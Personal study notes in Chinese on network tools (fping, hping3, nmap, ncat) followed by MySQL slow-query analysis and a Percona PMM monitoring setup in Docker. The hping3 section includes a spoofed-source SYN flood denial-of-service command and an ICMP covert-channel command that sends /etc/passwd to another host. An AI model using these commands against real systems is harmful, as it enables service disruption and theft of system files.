[(网络学习)5、iptables防火墙与网络攻击](https://segmentfault.com/a/1190000021427869)
====

1、a.fping：批量ping主机
----
fping类似于ping。
```markdown
fping -a[--alive] -f[ --file FILE] -g[--generate生成字符串、域列表]
-a：只显示存活主机；
-u：只显示不存活主机；
-l：循环ping
-g：通过指定起始地址与终止地址产生目标列表
fping -a -g 192.168.1.0/16
```
2、hping：高级tcp探测
----
hping是安全审计、防火墙测试等工作的标配工具。中文说明参考：[hping3 工具说明](https://blog.csdn.net/kernel_1984/article/details/88632230)
```markdown
hping3 host [options]
-p: 端口
-S: 设置tcp模式的syn包
-a: 伪造ip地址
-V  --verbose   详细模式
```
拒绝服务攻击
```markdown
使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。

hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```
文件传输
```markdown
Hping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：

hping3 192.168.1.159--listen signature --safe --icmp

监听ICMP包中的签名，根据签名解析出文件内容。 在发送端使用签名打包的ICMP包发送文件：

hping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd
将/etc/passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。
```

3、批量主机扫描: nmap、ncat
----
```markdown
nmap -sP 192.168.1.0/24 //扫描存活
-P          icmp扫描            快速有效
-sS         tcp.syn半扫描       高效，不易检测
-sT         tcp扫描             真实，可靠
-sU         udp扫描             有效透过防火墙

nc -vz -w2 192.168.1.112 10-100 //10-100的端口
-w          超时时间
-z          输入输出模式
-v          显示执行过程
-u/t        udp/tcp
```
4、pt-query-digest: MySQL慢查询分析工具
----
[MySQL慢查询分析工具pt-query-digest详解](https://blog.csdn.net/xiaoweite1/article/details/80299754)
```markdown
4.各工具用法简介（详细内容：https://www.percona.com/doc/percona-toolkit/2.2/index.html）
(1)慢查询日志分析统计(需要 sql.log 文件的读取)
pt-query-digest /home/wwwroot/cluster/mysql/data/slow.log  
(2)服务器摘要
pt-summary 
(3)服务器磁盘监测
pt-diskstats 
(4)mysql服务状态摘要
pt-mysql-summary --host 172.1.11.11 --user=root --password=123456 
```

所以要对不同容器的日志文件进行映射测试。开启：
```markdown
# slow_log(慢日志)，并注意目录映射
slow_query_log=1 #开启慢日志开关
slow_query_log_file=/var/lib/mysql/slow.log #定义日志位置和名字
long_query_time=0.5 #定义慢查询时间阈值，超过0.1s的语句记录慢日志
log_queries_not_using_indexes #没走索引的查询，记录慢日志
```

```markdown
# tool.sh 添加映射目录：
-v /home/wwwroot/cluster/mysql/data/:/mysql_files/  

pt-query-digest /mysql_files/slow.log 
```
5、PMM 监控 MySQL
----
```markdown
###本地主机 VM-deepin:
# 1.下载PMM Server Docker镜像
docker create -v /opt/prometheus/data -v /opt/consul-data -v /var/lib/mysql -v /var/lib/grafana --name pmm-data percona/pmm-server /bin/true
# 2.启动 pmm-server
docker run -d -p 9600:80 --network=others --ip=111.222.222.222 --volumes-from pmm-data --name pmm-server --restart=always percona/pmm-server
# 3.浏览器访问
http://192.168.1.111:9600/ //admin--admin

###docker容器 tool： 111.111.111.111:
# 4.安装pmm-client客户端
https://www.percona.com/downloads/pmm/1.17.3/binary/tarball/pmm-client-1.17.3.tar.gz
tar -zxvf pmm-client-1.17.3.tar.gz && cd pmm-client-1.17.3 && ./install
# 5.连接PMM Server
pmm-admin config --server 111.222.222.222 
#pmm-admin --help： pmm-admin list; pmm-admin repair; pmm-admin check-network; pmm-admin remove mysql
OK, PMM server is alive. 
PMM Server      | 111.222.222.222 
Client Name     | 0d17abcb826e
Client Address  | 111.111.111.111 
pmm-admin config --client 172.1.11.11 --client-name mysql8.mm
# 6.添加mysql监控
pmm-admin add mysql --user root --password 123456 --host 172.1.11.11 --port 3306
docker network connect mybridge tool --ip 172.1.111.111 
docker network connect mybridge pmm-server --ip 172.1.222.222
#docker network connect --help
#docker network disconnect mybridge tool
[mysql:queries] Error adding MySQL queries: "service" failed: exit status 1  #repair; /var/log/pmm-*.log等各种错误
# 7.总之 pmm-admin list 连接错误，改变客户端环境
[返回]本地主机 VM-deepin:
重复 6. : pmm-admin add mysql --user root --password 123456 --host 172.1.11.11 --port 3306
感动：
[mysql:queries] OK, now monitoring MySQL queries from perfschema using DSN root:***@tcp(172.1.11.11:3306)
```
```markdown
# 其它，命令学习
route -n
route add -net 172.1.0.0/16 gw 172.1.0.1 eth0
route add -host 172.1.111.111 gw 172.1.0.1
```
小结：
```markdown
1、问题解决过程
a. pmm-client（以下pc）环境问题没有被明确，但是可以从过程：
    [tool:111.111.111.111] 的 /var/log/pmm-*.log 看到结尾日志
/var/log/pmm-linux-metrics-42000.log:
level=info msg="Starting HTTPS server for https://111.111.111.111:42000/metrics ..." source="server.go:106"
/var/log/pmm-mysql-metrics-42002.log:
level=fatal msg="listen tcp 111.111.111.111:42002: bind: address already in use" source="mysqld_exporter.go:459"
    端口正常.莫名的问题，在这里查询多个网络部署实例无果，一大抄。感觉应该是环境问题。
b. 变换环境部署测试 
    1）先是把pc安装到mysql服务端本地（mm:172.1.11.11:3306），容器内命令测试，无差别。
    2）安装到本地主机 VM-deepin ,直接通过了:
环境总结: docker.pmm-data + docker.pmm-server[111.222.222.222: 外9600映射:80; 访问:http://192.168.1.111:9600/] 
    + docker.mysql[172.1.11.11: 无外:3306] + deepin主机[192.168.1.111] 
c.http: TLS handshake error from 192.168.1.111:58980: tls: first record does not look like a TLS handshake

pmm-admin config --server 192.168.1.111:9600  
pmm-admin config --bind-address 192.168.1.111 --client-address 192.168.1.111
pmm-admin add mysql --user root --password 123456 --host 172.1.11.11 --port 3306
iptables -I INPUT -p tcp  -m multiport --dports 42000,42002 -j ACCEPT
pmm-admin check-network
ok
ip地址bind-address能替换回去?，官方无配置文档，测试略
```
